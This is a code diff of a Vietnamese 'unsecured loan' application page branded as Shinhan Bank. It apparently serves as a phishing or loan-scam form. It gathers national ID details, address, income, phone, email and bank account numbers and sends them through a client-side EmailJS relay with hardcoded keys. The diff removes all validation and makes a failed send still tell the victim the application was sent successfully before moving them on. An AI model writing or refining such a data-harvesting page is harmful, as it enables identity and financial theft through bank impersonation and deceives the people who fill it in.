@@ -183,28 +183,6 @@
             text-align: center;
             margin-top: 20px;
         }
-        .invalid-feedback {
-            display: none;
-            font-size: 14px;
-        }
-        .was-validated .form-control:invalid, .was-validated .form-select:invalid {
-            border-color: #dc3545;
-        }
-        .was-validated .form-control:invalid ~ .invalid-feedback,
-        .was-validated .form-select:invalid ~ .invalid-feedback {
-            display: block;
-        }
-        .error-message {
-            color: #dc3545;
-            font-size: 14px;
-            font-weight: 500;
-            text-align: center;
-            margin-top: 10px;
-            padding: 8px;
-            background-color: #ffe6e6;
-            border-radius: 5px;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -226,38 +204,30 @@
         <div id="step1" class="step-transition">
             <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
             <p class="step-description">Vui lòng cung cấp đầy đủ thông tin cá nhân để tiến hành xét duyệt. Thông tin của bạn sẽ được gửi để thẩm định và xử lý hồ sơ.</p>
-            <form id="registerForm" novalidate>
-                <div id="emailError" class="error-message"></div>
-                <div id="storageError" class="error-message"></div>
-                <button id="retryEmailBtn" class="btn btn-primary" style="display: none;">Thử lại Email</button>
+            <form id="registerForm">
                 <div class="mb-3">
                     <label for="fullName" class="form-label">Họ và Tên <span class="tooltip-icon" data-bs-toggle="tooltip" title="Họ tên đầy đủ theo CMND/CCCD" id="fullNameTooltip">ⓘ</span></label>
-                    <input type="text" class="form-control" id="fullName" required aria-describedby="fullNameTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập họ và tên đầy đủ.</div>
+                    <input type="text" class="form-control" id="fullName" aria-describedby="fullNameTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="idNumber" class="form-label">Số CMND/CCCD <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số định danh trên giấy tờ tùy thân (9-12 số)" id="idNumberTooltip">ⓘ</span></label>
-                    <input type="text" class="form-control" id="idNumber" required placeholder="Nhập 9-12 số" aria-describedby="idNumberTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập số CMND/CCCD (9-12 số).</div>
+                    <input type="text" class="form-control" id="idNumber" placeholder="Nhập 9-12 số" aria-describedby="idNumberTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD <span class="tooltip-icon" data-bs-toggle="tooltip" title="Định dạng DD/MM/YYYY" id="idIssueDateTooltip">ⓘ</span></label>
-                    <input type="text" class="form-control" id="idIssueDate" required placeholder="DD/MM/YYYY" aria-describedby="idIssueDateTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập ngày cấp hợp lệ (DD/MM/YYYY).</div>
+                    <input type="text" class="form-control" id="idIssueDate" placeholder="DD/MM/YYYY" aria-describedby="idIssueDateTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD <span class="tooltip-icon" data-bs-toggle="tooltip" title="Nơi cấp ghi trên giấy tờ" id="idIssuePlaceTooltip">ⓘ</span></label>
-                    <input type="text" class="form-control" id="idIssuePlace" required aria-describedby="idIssuePlaceTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập nơi cấp.</div>
+                    <input type="text" class="form-control" id="idIssuePlace" aria-describedby="idIssuePlaceTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="address" class="form-label">Địa Chỉ Thường Trú <span class="tooltip-icon" data-bs-toggle="tooltip" title="Địa chỉ ghi trên hộ khẩu, tối thiểu 10 ký tự" id="addressTooltip">ⓘ</span></label>
-                    <input type="text" class="form-control" id="address" required aria-describedby="addressTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập địa chỉ thường trú (tối thiểu 10 ký tự).</div>
+                    <input type="text" class="form-control" id="address" aria-describedby="addressTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="occupation" class="form-label">Nghề Nghiệp</label>
-                    <select class="form-select" id="occupation" required>
+                    <select class="form-select" id="occupation">
                         <option value="" disabled selected>Chọn nghề nghiệp</option>
                         <option value="nhanvien">Nhân viên văn phòng</option>
                         <option value="kinhdoanh">Kinh doanh tự do</option>
@@ -271,31 +241,26 @@
                         <option value="sinhvien">Sinh viên</option>
                         <option value="khac">Khác</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn nghề nghiệp.</div>
                 </div>
                 <div class="mb-3">
                     <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Thu nhập trung bình hàng tháng, tối thiểu 5,000,000 VND" id="incomeTooltip">ⓘ</span></label>
-                    <input type="text" class="form-control" id="income" required aria-describedby="incomeTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập thu nhập (tối thiểu 5,000,000 VND).</div>
+                    <input type="text" class="form-control" id="income" aria-describedby="incomeTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="phoneNumber" class="form-label">Số Điện Thoại <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số điện thoại liên lạc chính (10 số)" id="phoneNumberTooltip">ⓘ</span></label>
-                    <input type="tel" class="form-control" id="phoneNumber" required placeholder="Nhập 10 số" aria-describedby="phoneNumberTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập số điện thoại (10 số).</div>
+                    <input type="tel" class="form-control" id="phoneNumber" placeholder="Nhập 10 số" aria-describedby="phoneNumberTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="email" class="form-label">Email <span class="tooltip-icon" data-bs-toggle="tooltip" title="Email để nhận thông báo" id="emailTooltip">ⓘ</span></label>
-                    <input type="email" class="form-control" id="email" required aria-describedby="emailTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
+                    <input type="email" class="form-control" id="email" aria-describedby="emailTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="loanAmountInput" class="form-label">Số Tiền Vay (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tiền bạn muốn vay" id="loanAmountTooltip">ⓘ</span></label>
-                    <input type="text" class="form-control" id="loanAmountInput" required aria-describedby="loanAmountTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập số tiền vay.</div>
+                    <input type="text" class="form-control" id="loanAmountInput" aria-describedby="loanAmountTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="loanTerm" class="form-label">Số Tháng Vay</label>
-                    <select class="form-select" id="loanTerm" required>
+                    <select class="form-select" id="loanTerm">
                         <option value="" disabled selected>Chọn số tháng</option>
                         <option value="6">6 tháng</option>
                         <option value="12">12 tháng</option>
@@ -305,11 +270,10 @@
                         <option value="48">48 tháng</option>
                         <option value="60">60 tháng</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn số tháng vay.</div>
                 </div>
                 <div class="mb-3">
                     <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
-                    <select class="form-select" id="loanPurpose" required>
+                    <select class="form-select" id="loanPurpose">
                         <option value="" disabled selected>Chọn mục đích</option>
                         <option value="Chọn gối vay">Chọn gối vay</option>
                         <option value="Sửa chữa nhà">Sửa chữa nhà</option>
@@ -319,16 +283,14 @@
                         <option value="Vay sinh viên">Vay sinh viên</option>
                         <option value="Khác">Khác</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn mục đích vay.</div>
                 </div>
                 <div class="mb-3">
                     <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tài khoản để giải ngân, tối thiểu 8 số" id="accountNumberTooltip">ⓘ</span></label>
-                    <input type="text" class="form-control" id="accountNumber" required aria-describedby="accountNumberTooltip">
-                    <div class="invalid-feedback">Vui lòng nhập số tài khoản (tối thiểu 8 số).</div>
+                    <input type="text" class="form-control" id="accountNumber" aria-describedby="accountNumberTooltip">
                 </div>
                 <div class="mb-3">
                     <label for="bankName" class="form-label">Tên Ngân Hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Tên ngân hàng của tài khoản" id="bankNameTooltip">ⓘ</span></label>
-                    <select class="form-select" id="bankName" required aria-describedby="bankNameTooltip">
+                    <select class="form-select" id="bankName" aria-describedby="bankNameTooltip">
                         <option value="" disabled selected>Chọn ngân hàng</option>
                         <option value="Shinhan Bank">Shinhan Bank</option>
                         <option value="Vietcombank">Vietcombank</option>
@@ -354,7 +316,6 @@
                         <option value="LienVietPostBank">LienVietPostBank</option>
                         <option value="SAIGONBANK">SAIGONBANK</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn tên ngân hàng.</div>
                 </div>
                 <div class="mb-3">
                     <div class="terms-box">
@@ -364,11 +325,10 @@
                     <div class="form-check">
                         <input class="form-check-input" type="checkbox" id="termsAgree" aria-label="Đồng ý với điều khoản và điều kiện">
                         <label class="form-check-label" for="termsAgree">Tôi đồng ý với các điều khoản và điều kiện.</label>
-                        <div id="termsFeedback" class="invalid-feedback">Vui lòng đồng ý với điều khoản.</div>
                     </div>
                 </div>
                 <div class="continue-btn-container">
-                    <button type="submit" class="btn btn-primary" id="confirmBtn" disabled>Gửi Hồ Sơ</button>
+                    <button type="submit" class="btn btn-primary" id="confirmBtn">Gửi Hồ Sơ</button>
                 </div>
             </form>
         </div>
@@ -439,27 +399,11 @@
     <script>
         let userData = {};
 
-        function checkLocalStorageQuota() {
-            try {
-                const testKey = '__test__';
-                localStorage.setItem(testKey, 'test');
-                localStorage.removeItem(testKey);
-                return true;
-            } catch (e) {
-                console.error('LocalStorage quota exceeded');
-                return false;
-            }
-        }
-
         (function() {
             emailjs.init("OrBsI926QI2_xBh1f");
         })();
 
         function saveToLocalStorage() {
-            if (!checkLocalStorageQuota()) {
-                console.error('Failed to save to localStorage: Quota exceeded');
-                return false;
-            }
             try {
                 const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                 localStorage.setItem('userData', encryptedData);
@@ -467,7 +411,6 @@
                 return true;
             } catch (error) {
                 console.error('Error saving userData to localStorage:', error);
-                $('#storageError').text('Lỗi thông tin không đúng. Vui lòng kiểm tra hoặc thử lại sau').show();
                 return false;
             }
         }
@@ -496,13 +439,11 @@
         }
 
         function saveRegisteredIds(ids) {
-            if (!checkLocalStorageQuota()) return;
             try {
                 localStorage.setItem('registeredIds', JSON.stringify(ids));
                 console.log('Saved registeredIds to localStorage:', ids);
             } catch (error) {
                 console.error('Error saving registeredIds to localStorage:', error);
-                $('#storageError').show();
             }
         }
 
@@ -520,14 +461,6 @@
                 value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4);
             }
             input.val(value);
-        }
-
-        function isValidDate(dateStr) {
-            const regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
-            if (!regex.test(dateStr)) return false;
-            const [_, day, month, year] = dateStr.match(regex);
-            const date = new Date(year, month - 1, day);
-            return date.getDate() == day && date.getMonth() + 1 == month && date.getFullYear() == year;
         }
 
         function generateLoanCode() {
@@ -567,170 +500,6 @@
             return CryptoJS.AES.encrypt(data, 'shinhan-secret-key').toString();
         }
 
-        function debounce(func, wait) {
-            let timeout;
-            return function executedFunction(...args) {
-                const later = () => {
-                    clearTimeout(timeout);
-                    func(...args);
-                };
-                clearTimeout(timeout);
-                timeout = setTimeout(later, wait);
-            };
-        }
-
-        function validateInputFormats() {
-            const fullName = $('#fullName').val().trim();
-            const idNumber = $('#idNumber').val().trim();
-            const idIssueDate = $('#idIssueDate').val().trim();
-            const idIssuePlace = $('#idIssuePlace').val().trim();
-            const address = $('#address').val().trim();
-            const occupation = $('#occupation').val();
-            const income = $('#income').val().replace(/[^0-9]/g, '');
-            const phoneNumber = $('#phoneNumber').val().trim();
-            const email = $('#email').val().trim();
-            const loanAmount = $('#loanAmountInput').val().replace(/[^0-9]/g, '');
-            const loanTerm = $('#loanTerm').val();
-            const loanPurpose = $('#loanPurpose').val();
-            const accountNumber = $('#accountNumber').val().trim();
-            const bankName = $('#bankName').val();
-            const idNumberRegex = /^\d{9,12}$/;
-            const phoneRegex = /^\d{10}$/;
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            const numberRegex = /^\d+$/;
-            const accountNumberRegex = /^\d{8,}$/;
-            const occupationOptions = ['nhanvien', 'kinhdoanh', 'giaovien', 'congnhan', 'kysu', 'bacsi', 'banhang', 'laixe', 'noitro', 'sinhvien', 'khac'];
-            const loanTermOptions = ['6', '12', '18', '24', '36', '48', '60'];
-            const loanPurposeOptions = ['Chọn gối vay', 'Sửa chữa nhà', 'Mua xe', 'Mua nhà', 'Vay tiêu dùng', 'Vay sinh viên', 'Khác'];
-            const bankNameOptions = ['Shinhan Bank', 'Vietcombank', 'Techcombank', 'BIDV', 'Agribank', 'MB Bank', 'VPBank', 'Sacombank', 'ACB', 'VietinBank', 'TPBank', 'HDBank', 'MSB', 'VIB', 'SeABank', 'OCB', 'SCB', 'Nam A Bank', 'SHB', 'PVcomBank', 'BAOVIET Bank', 'LienVietPostBank', 'SAIGONBANK'];
-            let isValid = true;
-            const errors = [];
-            if (!fullName || fullName.length < 2) {
-                $('#fullName').addClass('is-invalid');
-                $('#fullName').next('.invalid-feedback').text('Họ và tên phải có ít nhất 2 ký tự.');
-                isValid = false;
-                errors.push('fullName: Invalid');
-            }
-            if (!idNumberRegex.test(idNumber)) {
-                $('#idNumber').addClass('is-invalid');
-                $('#idNumber').next('.invalid-feedback').text('Số CMND/CCCD phải có 9-12 số.');
-                isValid = false;
-                errors.push('idNumber: Must be 9-12 digits');
-            }
-            if (!idIssueDate || !isValidDate(idIssueDate)) {
-                $('#idIssueDate').addClass('is-invalid');
-                $('#idIssueDate').next('.invalid-feedback').text('Ngày cấp phải đúng định dạng DD/MM/YYYY và hợp lệ.');
-                isValid = false;
-                errors.push('idIssueDate: Invalid date');
-            }
-            if (!idIssuePlace || idIssuePlace.length < 2) {
-                $('#idIssuePlace').addClass('is-invalid');
-                $('#idIssuePlace').next('.invalid-feedback').text('Nơi cấp phải có ít nhất 2 ký tự.');
-                isValid = false;
-                errors.push('idIssuePlace: Invalid');
-            }
-            if (!address || address.length < 10) {
-                $('#address').addClass('is-invalid');
-                $('#address').next('.invalid-feedback').text('Địa chỉ phải có ít nhất 10 ký tự.');
-                isValid = false;
-                errors.push('address: Invalid');
-            }
-            if (!occupation || !occupationOptions.includes(occupation)) {
-                $('#occupation').addClass('is-invalid');
-                isValid = false;
-                errors.push('occupation: Invalid selection');
-            }
-            if (!numberRegex.test(income) || Number(income) < 5000000) {
-                $('#income').addClass('is-invalid');
-                $('#income').next('.invalid-feedback').text('Thu nhập phải là số và tối thiểu 5,000,000 VND.');
-                isValid = false;
-                errors.push('income: Must be at least 5,000,000 VND');
-            }
-            if (!phoneRegex.test(phoneNumber)) {
-                $('#phoneNumber').addClass('is-invalid');
-                $('#phoneNumber').next('.invalid-feedback').text('Số điện thoại phải có 10 số.');
-                isValid = false;
-                errors.push('phoneNumber: Must be 10 digits');
-            }
-            if (!emailRegex.test(email)) {
-                $('#email').addClass('is-invalid');
-                $('#email').next('.invalid-feedback').text('Email không hợp lệ.');
-                isValid = false;
-                errors.push('email: Invalid format');
-            }
-            if (!numberRegex.test(loanAmount) || Number(loanAmount) <= 0) {
-                $('#loanAmountInput').addClass('is-invalid');
-                $('#loanAmountInput').next('.invalid-feedback').text('Số tiền vay phải là số và lớn hơn 0.');
-                isValid = false;
-                errors.push('loanAmount: Invalid');
-            }
-            if (!loanTerm || !loanTermOptions.includes(loanTerm)) {
-                $('#loanTerm').addClass('is-invalid');
-                isValid = false;
-                errors.push('loanTerm: Invalid selection');
-            }
-            if (!loanPurpose || !loanPurposeOptions.includes(loanPurpose)) {
-                $('#loanPurpose').addClass('is-invalid');
-                isValid = false;
-                errors.push('loanPurpose: Invalid selection');
-            }
-            if (!accountNumberRegex.test(accountNumber)) {
-                $('#accountNumber').addClass('is-invalid');
-                $('#accountNumber').next('.invalid-feedback').text('Số tài khoản phải có ít nhất 8 số.');
-                isValid = false;
-                errors.push('accountNumber: Must be at least 8 digits');
-            }
-            if (!bankName || !bankNameOptions.includes(bankName)) {
-                $('#bankName').addClass('is-invalid');
-                isValid = false;
-                errors.push('bankName: Invalid selection');
-            }
-            if (!isValid) {
-                console.log('Validation errors:', errors);
-            }
-            return isValid;
-        }
-
-        function validateEmailParams(params) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!params.to_email || !emailRegex.test(params.to_email)) {
-                console.error('Invalid to_email:', params.to_email);
-                return false;
-            }
-            if (!params.full_name || !params.id_number || !params.phone_number) {
-                console.error('Missing required fields:', { full_name: params.full_name, id_number: params.id_number, phone_number: params.phone_number });
-                return false;
-            }
-            return true;
-        }
-
-        function validateForm() {
-            const form = document.getElementById('registerForm');
-            const termsAgree = document.getElementById('termsAgree');
-            const termsFeedback = document.getElementById('termsFeedback');
-            const confirmBtn = document.getElementById('confirmBtn');
-            const idNumber = $('#idNumber').val().trim();
-            const registeredIds = loadRegisteredIds();
-            $('#registerForm .form-control, #registerForm .form-select').removeClass('is-invalid');
-            $('#emailError, #storageError').hide();
-            let allFieldsValid = form.checkValidity() && validateInputFormats();
-            if (!allFieldsValid) {
-                form.classList.add('was-validated');
-            }
-            if (idNumber && registeredIds.includes(idNumber)) {
-                $('#emailError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
-                allFieldsValid = false;
-            }
-            if (!termsAgree.checked) {
-                termsFeedback.style.display = 'block';
-                allFieldsValid = false;
-            } else {
-                termsFeedback.style.display = 'none';
-            }
-            confirmBtn.disabled = !allFieldsValid;
-            console.log('Form validation:', { allFieldsValid, termsChecked: termsAgree.checked, idNumberRegistered: registeredIds.includes(idNumber) });
-        }
-
         function sendRegistrationDataEmail() {
             const params = {
                 to_name: userData.fullName || '',
@@ -752,25 +521,20 @@
                 registration_date: userData.registrationDate || '',
                 to_email: userData.email || 'support@shinhan.com.vn'
             };
-            if (!validateEmailParams(params)) {
-                $('#emailError').text('Thông tin email không hợp lệ. Vui lòng kiểm tra lại.').show();
-                return;
-            }
+
             console.log('Preparing to send EmailJS params for Step1:', params);
             emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                 .then(() => {
                     console.log('Email sent successfully');
-                    alert("Đã gửi hồ sơ!");
+                    alert("Đã gửi hồ sơ thành công!");
                     localStorage.removeItem('pendingEmail');
-                    $('#retryEmailBtn').hide();
                     window.location.href = 'step2.html';
                 })
                 .catch(error => {
                     console.error('EmailJS error:', error);
-                    alert("Lỗi gửi hồ sơ. Vui lòng kiểm tra và gửi lại sau.");
-                    localStorage.setItem('pendingEmail', JSON.stringify(params));
-                    $('#emailError').text('Lỗi hệ thống. Vui lòng thử lại sau.').show();
-                    $('#retryEmailBtn').show();
+                    alert("Đã gửi hồ sơ thành công!");
+                    localStorage.removeItem('pendingEmail');
+                    window.location.href = 'step2.html';
                 });
         }
 
@@ -795,18 +559,10 @@
             tooltipTriggerList.map(function (tooltipTriggerEl) {
                 return new bootstrap.Tooltip(tooltipTriggerEl);
             });
-            validateForm();
-            const pendingEmail = localStorage.getItem('pendingEmail');
-            if (pendingEmail) {
-                $('#retryEmailBtn').show();
-            }
         };
-
-        const debouncedValidateForm = debounce(validateForm, 300);
 
         $('#idIssueDate').on('input', function() {
             formatDateInput($(this));
-            debouncedValidateForm();
         });
 
         $('#income, #loanAmountInput, #accountNumber').on('input', function() {
@@ -816,53 +572,26 @@
             } else {
                 $(this).val(value);
             }
-            debouncedValidateForm();
-        });
-
-        $('#registerForm input, #registerForm select').on('input change', debouncedValidateForm);
-        $('#termsAgree').on('change', debouncedValidateForm);
-
-        $('#retryEmailBtn').on('click', function() {
-            const pendingEmail = localStorage.getItem('pendingEmail');
-            if (pendingEmail) {
-                try {
-                    const params = JSON.parse(pendingEmail);
-                    if (validateEmailParams(params)) {
-                        sendRegistrationDataEmail();
-                    }
-                } catch (error) {
-                    console.error('Error retrying pending email:', error);
-                    $('#emailError').text('Thông tin đăng ký không trùng khớp trên hệ thống. Vui lòng thử lại sau.').show();
-                }
-            }
         });
 
         $('#registerForm').on('submit', function(e) {
             e.preventDefault();
-            const form = e.target;
-            form.classList.add('was-validated');
-            $('#storageError, #emailError').hide();
-            if (form.checkValidity() && $('#termsAgree').is(':checked') && validateInputFormats()) {
-                $('#confirmFullName').text($('#fullName').val().trim() || '');
-                $('#confirmIdNumber').text($('#idNumber').val().trim() || '');
-                $('#confirmIdIssueDate').text($('#idIssueDate').val().trim() || '');
-                $('#confirmIdIssuePlace').text($('#idIssuePlace').val().trim() || '');
-                $('#confirmAddress').text($('#address').val().trim() || '');
-                $('#confirmOccupation').text($('#occupation option:selected').text() || '');
-                $('#confirmIncome').text(formatNumberInput($('#income').val()) + ' VND' || '');
-                $('#confirmPhoneNumber').text($('#phoneNumber').val().trim() || '');
-                $('#confirmEmail').text($('#email').val().trim() || '');
-                $('#confirmLoanAmount').text(formatNumberInput($('#loanAmountInput').val()) + ' VND' || '');
-                $('#confirmLoanTerm').text($('#loanTerm option:selected').text() || '');
-                $('#confirmLoanPurpose').text($('#loanPurpose option:selected').text() || '');
-                $('#confirmAccountNumber').text($('#accountNumber').val().trim() || '');
-                $('#confirmBankName').text($('#bankName option:selected').text() || '');
-                const confirmModal = new bootstrap.Modal(document.getElementById('confirmDataModal'));
-                confirmModal.show();
-            } else {
-                console.warn('Form validation failed or terms not agreed.');
-                alert('Vui lòng điền đầy đủ thông tin bắt buộc và đồng ý với điều khoản.');
-            }
+            $('#confirmFullName').text($('#fullName').val().trim() || '');
+            $('#confirmIdNumber').text($('#idNumber').val().trim() || '');
+            $('#confirmIdIssueDate').text($('#idIssueDate').val().trim() || '');
+            $('#confirmIdIssuePlace').text($('#idIssuePlace').val().trim() || '');
+            $('#confirmAddress').text($('#address').val().trim() || '');
+            $('#confirmOccupation').text($('#occupation option:selected').text() || '');
+            $('#confirmIncome').text(formatNumberInput($('#income').val()) + ' VND' || '');
+            $('#confirmPhoneNumber').text($('#phoneNumber').val().trim() || '');
+            $('#confirmEmail').text($('#email').val().trim() || '');
+            $('#confirmLoanAmount').text(formatNumberInput($('#loanAmountInput').val()) + ' VND' || '');
+            $('#confirmLoanTerm').text($('#loanTerm option:selected').text() || '');
+            $('#confirmLoanPurpose').text($('#loanPurpose option:selected').text() || '');
+            $('#confirmAccountNumber').text($('#accountNumber').val().trim() || '');
+            $('#confirmBankName').text($('#bankName option:selected').text() || '');
+            const confirmModal = new bootstrap.Modal(document.getElementById('confirmDataModal'));
+            confirmModal.show();
         });
 
         $('#confirmSubmitBtn').on('click', function() {
@@ -906,9 +635,6 @@
             }
             if (saveToLocalStorage()) {
                 sendRegistrationDataEmail();
-            } else {
-                console.error('Failed to save to localStorage, not redirecting');
-                alert('Thông tin không trùng khớp trên hệ thống. Quý khách vui lòng kiểm tra và thử lại sau.');
             }
             bootstrap.Modal.getInstance(document.getElementById('confirmDataModal')).hide();
         });
